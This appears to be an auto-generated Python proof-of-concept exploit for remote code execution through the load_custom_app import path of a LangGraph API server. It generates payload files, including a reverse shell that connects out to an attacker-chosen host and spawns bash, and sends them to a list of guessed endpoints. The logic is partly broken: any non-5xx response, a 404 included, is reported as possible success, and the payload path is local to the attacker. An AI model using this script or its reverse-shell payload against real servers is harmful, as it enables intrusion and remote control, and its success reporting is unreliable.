#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-006
# Sink: load_custom_app
# Auto-generated — run with: python3 rce_python_module_importlib_load_custom_app.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src's load_custom_app function.

Vulnerability: The function accepts an attacker-controlled `app_import` string,
splits it on ':' to get a path and name, then uses importlib to dynamically
import the module from that path without validation. An attacker can specify
an arbitrary Python file path to execute arbitrary code.

Impact: Remote Code Execution (RCE) with the privileges of the server process.

Usage:
    python3 poc.py --target http://localhost:8000 --payload /tmp/evil.py:app

    The payload file should contain a Starlette/FastAPI application object
    named 'app' (or whatever name is specified after the colon). The code
    in that file will be executed during import.

    For a benign test, use the --benign flag to create a harmless payload
    that writes to /tmp/poc_success.txt.
"""

import argparse
import os
import sys
import tempfile
import requests
import time

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"

def create_benign_payload():
    """Create a benign payload file that writes to /tmp/poc_success.txt"""
    payload_code = '''
import os
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse
from starlette.routing import Route

async def index(request):
    return PlainTextResponse("PWNED")

# This code runs during import - write marker file
os.system("touch /tmp/poc_success.txt")

app = Starlette(routes=[
    Route('/', index),
])
'''
    # Write to a temporary file
    fd, path = tempfile.mkstemp(suffix='.py', prefix='poc_')
    with os.fdopen(fd, 'w') as f:
        f.write(payload_code)
    return path

def create_reverse_shell_payload(lhost, lport):
    """Create a reverse shell payload (for demonstration only)"""
    payload_code = f'''
import os
import sys
import socket
import subprocess
import pty
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse
from starlette.routing import Route

# Reverse shell in a thread
import threading
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
    except:
        pass

t = threading.Thread(target=reverse_shell, daemon=True)
t.start()

async def index(request):
    return PlainTextResponse("Shell spawned")

app = Starlette(routes=[
    Route('/', index),
])
'''
    fd, path = tempfile.mkstemp(suffix='.py', prefix='poc_revshell_')
    with os.fdopen(fd, 'w') as f:
        f.write(payload_code)
    return path

def exploit(target_url, payload_path, app_name="app"):
    """
    Send the malicious app_import string to the vulnerable endpoint.
    
    The endpoint is typically something like:
        POST /api/custom_app
        {"app_import": "/path/to/payload.py:app"}
    
    Or it might be a query parameter. We'll try common patterns.
    """
    app_import = f"{payload_path}:{app_name}"
    
    # Try different possible endpoints
    endpoints = [
        "/api/custom_app",
        "/api/app/load",
        "/api/load_app",
        "/api/custom-app",
        "/api/v1/custom_app",
    ]
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    
    payload = {"app_import": app_import}
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload path: {payload_path}")
    print(f"[*] App import string: {app_import}")
    print()
    
    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        print(f"[*] Trying: POST {url}")
        
        try:
            resp = requests.post(
                url,
                json=payload,
                headers=headers,
                timeout=10,
                verify=False  # For self-signed certs
            )
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:200]}")
            
            if resp.status_code < 500:  # Any non-server error might indicate success
                print(f"[+] Possible success on {endpoint}")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection refused")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    # Also try GET with query parameter
    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}?app_import={app_import}"
        print(f"[*] Trying: GET {url}")
        
        try:
            resp = requests.get(
                url,
                headers=headers,
                timeout=10,
                verify=False
            )
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:200]}")
            
            if resp.status_code < 500:
                print(f"[+] Possible success on GET {endpoint}")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection refused")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langgraph_api_src load_custom_app"
    )
    parser.add_argument(
        "--target", "-t",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload", "-p",
        help="Path to malicious Python file (e.g., /tmp/evil.py:app)"
    )
    parser.add_argument(
        "--benign", "-b",
        action="store_true",
        help="Use a benign payload that writes to /tmp/poc_success.txt"
    )
    parser.add_argument(
        "--reverse-shell", "-r",
        nargs=2,
        metavar=("LHOST", "LPORT"),
        help="Create a reverse shell payload (LHOST LPORT)"
    )
    parser.add_argument(
        "--app-name", "-n",
        default="app",
        help="Name of the app object in the payload (default: app)"
    )
    
    args = parser.parse_args()
    
    # Determine payload
    if args.payload:
        # Parse payload path and app name
        if ":" in args.payload:
            payload_path, app_name = args.payload.rsplit(":", 1)
        else:
            payload_path = args.payload
            app_name = args.app_name
        
        if not os.path.exists(payload_path):
            print(f"[!] Payload file not found: {payload_path}")
            sys.exit(1)
            
    elif args.reverse_shell:
        lhost, lport = args.reverse_shell
        print(f"[*] Creating reverse shell payload to {lhost}:{lport}")
        payload_path = create_reverse_shell_payload(lhost, int(lport))
        app_name = args.app_name
        print(f"[*] Payload written to: {payload_path}")
        
    elif args.benign:
        print("[*] Creating benign payload...")
        payload_path = create_benign_payload()
        app_name = args.app_name
        print(f"[*] Benign payload written to: {payload_path}")
        print("[*] After successful exploitation, check for /tmp/poc_success.txt")
        
    else:
        # Default to benign
        print("[*] No payload specified, using benign payload")
        payload_path = create_benign_payload()
        app_name = args.app_name
        print(f"[*] Benign payload written to: {payload_path}")
    
    print()
    print("=" * 60)
    print("Starting exploitation...")
    print("=" * 60)
    print()
    
    success = exploit(args.target, payload_path, app_name)
    
    print()
    if success:
        print("[+] Exploit attempt completed (check for signs of success)")
    else:
        print("[-] Exploit attempt did not detect clear success")
        print("[*] The endpoint might be at a different path or require authentication")
    
    # Clean up temp files if we created them
    if args.benign or args.reverse_shell or not args.payload:
        try:
            os.unlink(payload_path)
            print(f"[*] Cleaned up temp payload: {payload_path}")
        except:
            pass

if __name__ == "__main__":
    main()
